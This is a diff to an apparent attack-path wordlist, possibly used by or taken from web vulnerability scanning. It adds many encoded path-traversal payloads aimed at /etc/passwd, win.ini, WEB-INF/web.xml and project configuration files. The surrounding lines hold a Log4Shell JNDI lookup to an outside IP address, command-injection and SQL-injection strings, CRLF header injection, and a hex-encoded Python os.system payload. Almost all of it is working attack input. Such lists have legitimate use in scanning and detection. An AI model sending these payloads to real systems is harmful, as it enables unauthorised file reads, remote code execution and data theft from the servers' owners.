@@ -4,8 +4,27 @@ $%7Bjndi:ldap://115.28.134.231:1389/Exploit%7D
 %20../web-inf/
 25twdIMfRgQmjF6PvkbGAf9JfsL.php
 25twdJjfpeOIAfKLGmXIrR58YEK.php%5Cx0A
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fGemfile HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage-lock.json HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fweb.config HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fGemfile HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage-lock.json HTTP/1.1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fweb.config HTTP/1.1
+%2e%2e%2f%2e%2e%2fGemfile HTTP/1.1
+%2e%2e%2f%2e%2e%2fpackage.json HTTP/1.1
+%2e%2e%2f%2e%2e%2fpackage-lock.json HTTP/1.1
+%2e%2e%2f%2e%2e%2fweb.config HTTP/1.1
+%2e%2e%2fGemfile HTTP/1.1
+%2e%2e%2fpackage.json HTTP/1.1
+%2e%2e%2fpackage-lock.json HTTP/1.1
+%2e%2e%2fweb.config HTTP/1.1
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd HTTP/1.1
+/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini HTTP/1.1
 ...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwindows%5Cwin.ini
 ....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwindows%5Cwin.ini
+//%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd HTTP/1.1
 about/../tree?action=get
 account
 account/register
@@ -65,6 +84,9 @@ bag2
 boardDataWW.php
 BSW_cxttongr.htm
 bugs/verify.php?confirm_hash=&id=1
+/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/WEB-INF/web.xml? HTTP/1.1
+/%C0%AE%C0%AE/%C0%AE%C0%AE/WEB-INF/web.xml? HTTP/1.1
+/%C0%AE%C0%AE/WEB-INF/web.xml? HTTP/1.1
 carbon/admin/login_action.jsp
 card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60
 casa/nodes/thumbprints
@@ -151,6 +173,11 @@ etc/groovyconsole.html
 ../../../../../../../etc/passwd
 ../../../..//etc/passwd
 ../../etc/passwd
+/../../../../../../../../etc/passwd%00.jpg HTTP/1.1
+/../../../../../../../../etc/passwd%00.jsp HTTP/1.1
+/../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
+/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
+/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\etc/passwd HTTP/1.1
 exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
 favicon.ico
 fed.rpc.solo.io.GlooInstanceApi/ListClusterDetails
@@ -163,6 +190,11 @@ _fragment?_path=_controller=phpcredits&flag=-1
 ftb.imagegallery.aspx
 fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
 GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
+../../../../../Gemfile HTTP/1.1
+../../../../Gemfile HTTP/1.1
+../../../Gemfile HTTP/1.1
+../../Gemfile HTTP/1.1
+../Gemfile HTTP/1.1
 general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
 gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log
 getcfg.php
@@ -279,6 +311,14 @@ op/op.Login.php
 orders/3
 overview.asp
 owa/auth/x.js
+../../../../package.json HTTP/1.1
+../../../package.json HTTP/1.1
+../../package.json HTTP/1.1
+../package.json HTTP/1.1
+../../../../package-lock.json HTTP/1.1
+../../../package-lock.json HTTP/1.1
+../../package-lock.json HTTP/1.1
+../package-lock.json HTTP/1.1
 pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
 pages/createpage.action?spaceKey=myproj
 pages/createpage-entervariables.action
@@ -339,7 +379,11 @@ testing-put.txt
 tests/support/stores/test_grid_filter.php?query=phpinfo();
 test.txt%0D%0ASet-Cookie:CRLFInjection%3DTest%0D%0ALocation:%20example.com%0D%0AX-XSS-Protection:0
 theme/default/img/../../../../../../../../../../../../../../../..//etc/passwd
+/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd HTTP/1.1
+/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215windows/win.ini HTTP/1.1
 ucmdb-api/connect
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd HTTP/1.1
+/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini HTTP/1.1
 ui/login.php?user=admin
 uir//etc/passwd
 upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''
@@ -363,7 +407,19 @@ webadmin/index.php
 webadmin/out
 webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
 webapi/v1/system/accountmanage/account
+../../../../../web.config HTTP/1.1
+../../../../web.config HTTP/1.1
+../../../web.config HTTP/1.1
+../../web.config HTTP/1.1
+../web.config HTTP/1.1
 web.config.i18n.ashx?l=nuclei&v=nuclei
+/../../../WEB-INF/web.xml%00.jsp HTTP/1.1
+/../../WEB-INF/web.xml%00.jsp HTTP/1.1
+/../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
+/../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
+/../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
+/../../../WEB-INF/web.xml? HTTP/1.1
+/../WEB-INF/web.xml? HTTP/1.1
 WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
 website/blog/
 webtools/control/main
@@ -374,6 +430,10 @@ wiki/pages/createpage-entervariables.action?SpaceKey=x
 ..../..../..../..../..../..../..../..../..../windows/win.ini
 .../.../.../.../.../.../.../.../.../windows/win.ini
 ../../../../../../../../windows/win.ini
+/../../../../../../../../windows/win.ini%00.jpg HTTP/1.1
+/../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
+/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
+/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\windows/win.ini HTTP/1.1
 wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
 wls-wsat/RegistrationRequesterPortType
 wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
